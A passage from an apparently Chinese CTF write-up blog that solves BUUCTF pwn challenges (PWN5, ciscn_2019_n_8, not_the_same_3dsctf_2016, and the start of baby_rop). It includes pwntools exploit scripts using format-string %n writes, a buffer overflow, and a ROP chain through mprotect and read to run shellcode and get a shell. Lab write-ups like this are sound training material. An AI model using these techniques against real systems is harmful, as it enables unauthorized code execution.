<span class="token number">06</span><span class="token punctuation">:</span><span class="token number">0018</span>│      <span class="token number">0xffae17a8</span> ◂— <span class="token number">0xc2</span>
<span class="token number">07</span><span class="token punctuation">:</span>001c│      <span class="token number">0xffae17ac</span> —▸ <span class="token function">0xf7e1e6bb</span> <span class="token punctuation">(</span>handle_intel<span class="token operator">+</span><span class="token number">107</span><span class="token punctuation">)</span> ◂— add    esp<span class="token punctuation">,</span> <span class="token number">0x10</span>
─────────────────────────────────<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>──────────────────────────────────
 ► f <span class="token number">0</span>  80492ce
   f <span class="token number">1</span> f7da6637 __libc_start_main<span class="token operator">+</span><span class="token number">247</span>
gdb<span class="token operator">-</span>peda$ x<span class="token operator">/</span>20wx <span class="token number">0x804C044</span>
<span class="token number">0x804c044</span><span class="token punctuation">:</span>    <span class="token number">0x00000004</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>
<span class="token number">0x804c054</span><span class="token punctuation">:</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>
<span class="token number">0x804c064</span><span class="token punctuation">:</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>
<span class="token number">0x804c074</span><span class="token punctuation">:</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>
<span class="token number">0x804c084</span><span class="token punctuation">:</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>
gdb<span class="token operator">-</span>peda$
</code></pre>
<p>可以看到</p>
<p>当前值被修改为了0x00000004</p>
<p>所以我们在输入pass时输入0x00000004即可getshell</p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'PWN5'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#elf=ELF('PWN5')</span>
<span class="token comment" spellcheck="true">#system=elf.plt['system']</span>
<span class="token comment" spellcheck="true">#atoi=elf.got['atoi']</span>
<span class="token comment" spellcheck="true">#log.info(p.recvuntil('your name:'))</span>
<span class="token comment" spellcheck="true">#payload=fmtstr_payload(10,{atoi:system})</span>
<span class="token comment" spellcheck="true">#p.sendline(payload)</span>
<span class="token comment" spellcheck="true">#p.sendline('sh')</span>
<span class="token comment" spellcheck="true">#p.interactive()</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your name:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
addr<span class="token operator">=</span><span class="token number">0x804C044</span>
payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"%10$n"</span>
<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr <span class="token operator">=</span> <span class="token string">'0x80492A6'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    raw_input<span class="token punctuation">(</span><span class="token string">'debug:'</span><span class="token punctuation">)</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token string">"b *"</span> <span class="token operator">+</span> addr<span class="token punctuation">)</span>
debug<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your passwd:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x00000004</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>此payload试了下远程没通 应该是程序权限的原因</p>
<p>我们一字节一字节进行修改</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">addr<span class="token operator">=</span><span class="token number">0x804C044</span>
payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>addr<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>addr<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>addr<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"%10$hhn%11$hhn%12$hhn%13$hhn"</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr <span class="token operator">=</span> <span class="token string">'0x80492A6'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    raw_input<span class="token punctuation">(</span><span class="token string">'debug:'</span><span class="token punctuation">)</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token string">"b *"</span> <span class="token operator">+</span> addr<span class="token punctuation">)</span>
debug<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</code></pre>
<pre><code>───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ esp  0xffe7b120 —▸ 0x804a027 ◂— &#39;your passwd:&#39;
01:0004│      0xffe7b124 —▸ 0xffe7b148 —▸ 0x804c044 ◂— 0x10101010
02:0008│      0xffe7b128 ◂— 0x63 /* &#39;c&#39; */
03:000c│      0xffe7b12c ◂— 0x0
04:0010│      0xffe7b130 —▸ 0xffe7b16e ◂— &#39;13$hhn\n&#39;
05:0014│      0xffe7b134 ◂— 0x3
06:0018│      0xffe7b138 ◂— 0xc2
07:001c│      0xffe7b13c —▸ 0xf7db36bb (handle_intel+107) ◂— add    esp, 0x10
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0  80492ce
   f 1 f7d3b637 __libc_start_main+247
gdb-peda$ x/20wx 0x804C044
0x804c044:    0x10101010    0x00000000    0x00000000    0x00000000
0x804c054:    0x00000000    0x00000000    0x00000000    0x00000000
0x804c064:    0x00000000    0x00000000    0x00000000    0x00000000
0x804c074:    0x00000000    0x00000000    0x00000000    0x00000000
0x804c084:    0x00000000    0x00000000    0x00000000    0x00000000
gdb-peda$ 

&lt;p class=&quot;code-caption&quot; data-lang=&quot;&quot; data-line_number=&quot;frontend&quot; data-trim_indent=&quot;backend&quot; data-label_position=&quot;outer&quot; data-labels_left=&quot;&quot; data-labels_right=&quot;&quot; data-labels_copy=&quot;&quot;&gt;&lt;span class=&quot;code-caption-label&quot;&gt;&lt;/span&gt;&lt;/p&gt;
</code></pre><p>看到当前0x804c044值为0x10101010</p>
<p>所以我们输入pass为0x10101010 即可getshell</p>
<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28184</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#p=process('PWN5')</span>
<span class="token comment" spellcheck="true">#elf=ELF('PWN5')</span>
<span class="token comment" spellcheck="true">#system=elf.plt['system']</span>
<span class="token comment" spellcheck="true">#atoi=elf.got['atoi']</span>
<span class="token comment" spellcheck="true">#log.info(p.recvuntil('your name:'))</span>
<span class="token comment" spellcheck="true">#payload=fmtstr_payload(10,{atoi:system})</span>
<span class="token comment" spellcheck="true">#p.sendline(payload)</span>
<span class="token comment" spellcheck="true">#p.sendline('sh')</span>
<span class="token comment" spellcheck="true">#p.interactive()</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your name:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
addr<span class="token operator">=</span><span class="token number">0x804C044</span>
payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>addr<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>addr<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>addr<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"%10$hhn%11$hhn%12$hhn%13$hhn"</span>
<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr <span class="token operator">=</span> <span class="token string">'0x80492A6'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    raw_input<span class="token punctuation">(</span><span class="token string">'debug:'</span><span class="token punctuation">)</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token string">"b *"</span> <span class="token operator">+</span> addr<span class="token punctuation">)</span>
debug<span class="token punctuation">(</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your passwd:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x10101010</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><p>题目不难</p>
<p>我的f5解析的有问题</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-14h] [ebp-20h]</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-10h] [ebp-1Ch]</span>

  var<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  var<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What's your name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>var<span class="token punctuation">,</span> v4<span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>var<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>var<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x11</span><span class="token punctuation">)</span>
      <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
      <span class="token function">printf</span><span class="token punctuation">(</span>
        <span class="token string">"something wrong! val is %d"</span><span class="token punctuation">,</span>
        var<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        var<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        var<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        var<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        var<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        var<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        var<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        var<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        var<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        var<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        var<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        var<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        var<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        var<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        var<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s, Welcome!\n"</span><span class="token punctuation">,</span> var<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try do something~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>查看 scanf读入字符串存入var处</p>
<p>这里f5处的条件为 var的14位要存在且第14位的值为0x11（从0位开始计算）</p>
<p>通过Ghidra解析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">
<span class="token comment" spellcheck="true">/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */</span>

undefined4 <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  undefined4 uVar2<span class="token punctuation">;</span>
  <span class="token keyword">int</span> in_GS_OFFSET<span class="token punctuation">;</span>
  EVP_PKEY_CTX <span class="token operator">*</span>ctx<span class="token punctuation">;</span>

  iVar1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>in_GS_OFFSET <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  var<span class="token punctuation">.</span>_52_4_ <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  var<span class="token punctuation">.</span>_56_4_ <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">init</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What\'s your name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>DAT_0001201a<span class="token punctuation">,</span>var<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>_52_4_ <span class="token operator">|</span> var<span class="token punctuation">.</span>_56_4_<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s, Welcome!\n"</span><span class="token punctuation">,</span>var<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try do something~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>_52_4_ <span class="token operator">^</span> <span class="token number">0x11</span> <span class="token operator">|</span> var<span class="token punctuation">.</span>_56_4_<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"something wrong! val is %d"</span><span class="token punctuation">,</span>var<span class="token punctuation">.</span>_0_4_<span class="token punctuation">,</span>var<span class="token punctuation">.</span>_4_4_<span class="token punctuation">,</span>var<span class="token punctuation">.</span>_8_4_<span class="token punctuation">,</span>var<span class="token punctuation">.</span>_12_4_<span class="token punctuation">,</span>var<span class="token punctuation">.</span>_16_4_<span class="token punctuation">,</span>
             var<span class="token punctuation">.</span>_20_4_<span class="token punctuation">,</span>var<span class="token punctuation">.</span>_24_4_<span class="token punctuation">,</span>var<span class="token punctuation">.</span>_28_4_<span class="token punctuation">,</span>var<span class="token punctuation">.</span>_32_4_<span class="token punctuation">,</span>var<span class="token punctuation">.</span>_36_4_<span class="token punctuation">,</span>var<span class="token punctuation">.</span>_40_4_<span class="token punctuation">,</span>var<span class="token punctuation">.</span>_44_4_<span class="token punctuation">,</span>var<span class="token punctuation">.</span>_48_4_
             <span class="token punctuation">,</span>var<span class="token punctuation">.</span>_52_4_<span class="token punctuation">,</span>var<span class="token punctuation">.</span>_56_4_<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  uVar2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">!=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>in_GS_OFFSET <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    uVar2 <span class="token operator">=</span> <span class="token function">__stack_chk_fail_local</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> uVar2<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>if ((var._52_4_ ^ 0x11 | var._56_4_) == 0) </p>
<p>对比分析 可以知道第十四位其实为输入的第53位（从0计算到52）</p>
<p>所以可以得到exp</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>from pwn import *
context.log_level = &#39;debug&#39; 
p=process(&#39;./ciscn_2019_n_8&#39;)
payload=&#39;a&#39;*52+p32(0x11)
print &quot;payload:&quot;+str(payload)
log.info(p.recvuntil(&quot;What&#39;s your name?&quot;))
p.sendline(payload)
p.interactive()
</code></pre><h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><p>checksec</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~/APwn/buuctf$ checksec not_the_same_3dsctf_2016
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/APwn/buuctf/not_the_same_3dsctf_2016'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
ios@ubuntu:~/APwn/buuctf$
</code></pre>
<p>查看下代码</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Fh] [ebp-2Dh]</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b0r4 v3r s3 7u 4h o b1ch4o m3m0... "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>函数很简单 给了gets 存在栈溢出</p>
<p>这里我使用了之前题目的方法 </p>
<p>使用 mprotect() 修改一块地址段权限为可读可写可执行</p>
<p>接着rop构造read 在该地址段写入shellcode 从而getshell</p>
<p>如果还是没弄明白的可以参考上文</p>
<h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./not_the_same_3dsctf_2016'</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'not_the_same_3dsctf_2016'</span><span class="token punctuation">)</span>
read_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
ss<span class="token operator">=</span><span class="token number">0x080ea000</span>
mprotect<span class="token operator">=</span><span class="token number">0x806ED40</span>
pop3<span class="token operator">=</span><span class="token number">0x0804f420</span><span class="token comment" spellcheck="true"># pop ebx ; pop esi ; pop ebp ; ret</span>
shellcode<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">45</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop3<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x080ea000</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop3<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ss<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#gdb.attach(p, "b *" + "0x80489E0")</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h1 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h1><p>### </p>
<p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~/APwn/buuctf$ checksec HarekazeCTF2019_babyrop
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/APwn/buuctf/HarekazeCTF2019_babyrop'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
ios@ubuntu:~/APwn/buuctf$
</code></pre>
<p>查看代码</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-10h]</span>

  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo -n \"What's your name? \""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to the Pwn World, %s!\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>只开了nx且存在栈溢出</p>
<p>发现给了system函数 </p>
<p>shift+f12搜索字符串</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
